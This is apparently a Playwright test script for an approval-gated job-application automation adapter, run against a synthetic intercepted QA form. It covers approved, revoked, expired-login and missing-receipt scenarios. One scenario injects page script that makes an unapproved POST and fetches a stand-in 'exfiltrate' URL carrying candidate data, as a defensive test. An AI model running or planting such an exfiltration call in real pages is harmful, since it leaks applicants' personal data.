// Deterministic adapter against an intercepted first-party QA page. No real submissions.
// Optional ANCHOR_CDP_URL uses an existing operator-created Anchor session; never logs its URL.
const {chromium}=require('playwright');
const fs=require('node:fs');
const assert=require('node:assert/strict');
const path=require('node:path');
const ROOT=path.resolve('artifacts/anchor-worker');fs.mkdirSync(ROOT,{recursive:true});
const target='https://qa.skillsurger.com/application/123';
const html=fs.readFileSync('scripts/fixtures/anchor-application.html','utf8');
const inputs={contract_version:'application_v1',action_id:'synthetic-action-123',payload_hash:'synthetic-approved-hash',cv_version_id:'synthetic-cv-1',
  application_url:target,answers_json:JSON.stringify({full_name:'Synthetic Candidate',email:'synthetic@example.com'}),
  cv_json:JSON.stringify({headline:'Python Backend Engineer',summary:{text:'Builds Python APIs',evidence:['role']},sections:[{heading:'Skills',items:[{text:'Python, FastAPI, PostgreSQL',evidence:['skills']}]}]}),
  cover_note:'Synthetic note. No candidate or vacancy is real in this fixture.'};
const adapter={site:'qa.skillsurger.com',pathPrefix:'/application/',submitPath:'/submit',formSelector:'#application',
  fields:{full_name:'#full-name',email:'#email'},coverNoteSelector:'#cover-note',resumeSelector:'#resume',
  submitSelector:'#submit-application',receiptSelector:'#receipt',receiptAttribute:'data-receipt',loginSelector:'#login',receiptTimeoutMs:process.env.ANCHOR_CDP_URL?15000:1000};
(async()=>{
  const {executeApprovedApplication}=await import('../automation/approved-application.mjs');
  const browser=process.env.ANCHOR_CDP_URL?await chromium.connectOverCDP(process.env.ANCHOR_CDP_URL,{timeout:20000}):await chromium.launch({headless:true});
  const results=[];
  try{
    const context=await browser.newContext({viewport:{width:390,height:844}});
    const page=await context.newPage();
    for(const scenario of ['approved','early_submit','revoked','unknown_question','expired_login','missing_receipt']){
      let submissions=0,checks=0,body='';
      await context.route('**/*',async route=>{
        const request=route.request();const u=new URL(request.url());
        if(u.href===target){
          let fixture=html;
          if(scenario==='unknown_question')fixture=fixture.replace('</form>','<label>Notice period<input id="notice-period" required></label></form>');
          if(scenario==='expired_login')fixture='<h1 id="login">Sign in again</h1>';
          if(scenario==='early_submit')fixture=fixture.replace('</body>',"<script>fetch('/submit',{method:'POST',body:'unapproved'}).catch(()=>{});fetch('https://unreviewed.example.com/exfiltrate?candidate=secret').catch(()=>{});</script></body>");
          return route.fulfill({status:200,contentType:'text/html',body:fixture});
        }
        if(u.pathname==='/submit' && request.method()==='POST'){
          submissions++;body=request.postDataBuffer().toString('latin1');
          return route.fulfill({status:200,contentType:'application/json',body:JSON.stringify(scenario==='missing_receipt'?{}:{action_id:inputs.action_id,confirmation_reference:'QA-RECEIPT-123'})});
        }
        return route.abort();
      });
      const output=await executeApprovedApplication({page,inputs,adapter:scenario==='missing_receipt'?{...adapter,receiptTimeoutMs:1000}:adapter,authorizeSubmit:async()=>{checks++;return scenario!=='revoked';}});
      const expected={approved:'submitted',early_submit:'submitted',revoked:'not_submitted',unknown_question:'needs_input',expired_login:'needs_login',missing_receipt:'unknown'}[scenario];
      if(output.outcome!==expected) {
        console.log('Mismatch',JSON.stringify({scenario,actual:output.outcome,expected,submissions,checks}));
        await page.screenshot({path:path.join(ROOT,'adapter-failure.png'),fullPage:true});
        fs.writeFileSync(path.join(ROOT,'adapter-failure.json'),JSON.stringify({scenario,actual:output.outcome,expected,submissions,checks},null,2));
      }
      assert.equal(output.outcome,expected);
      assert.equal(submissions,['approved','early_submit','missing_receipt'].includes(scenario)?1:0);
      // CDP can omit file bytes from Network.postData. Inspect the actual browser File,
      // rather than treating a redacted network body as a failed upload.
      let upload=null;
      if(submissions){
        assert.ok(body.includes('Synthetic Candidate'));
        upload=await page.locator('#resume').evaluate(async input=>{
          const file=input.files[0];return {name:file.name,type:file.type,size:file.size,prefix:new TextDecoder().decode((await file.arrayBuffer()).slice(0,5))};
        });
        assert.equal(upload.prefix,'%PDF-');assert.equal(upload.name,'skillsurger-approved-cv.pdf');assert.ok(upload.size>100);
      }
      if(scenario==='approved')await page.screenshot({path:path.join(ROOT,'synthetic-application-receipt.png'),fullPage:true});
      results.push({scenario,outcome:output.outcome,submissions,authorization_checks:checks,upload});
      console.log('PASS',scenario,output.outcome,'submissions='+submissions);
      await context.unroute('**/*');
    }
    await context.close();
    const report={checked_at:new Date().toISOString(),browser:process.env.ANCHOR_CDP_URL?'Anchor remote Chromium':'local Chromium',scope:'controlled synthetic form; no employer or job-board request',results};
    fs.writeFileSync(path.join(ROOT,process.env.ANCHOR_CDP_URL?'anchor-browser-evidence.json':'local-browser-evidence.json'),JSON.stringify(report,null,2)+'\n');
  }finally{await browser.close();}
})().catch(e=>{console.error('FAIL',e.name==='AssertionError'?{name:e.name,actual:e.actual,expected:e.expected}:process.env.ANCHOR_CDP_URL?e.name:e.message);process.exitCode=1;});
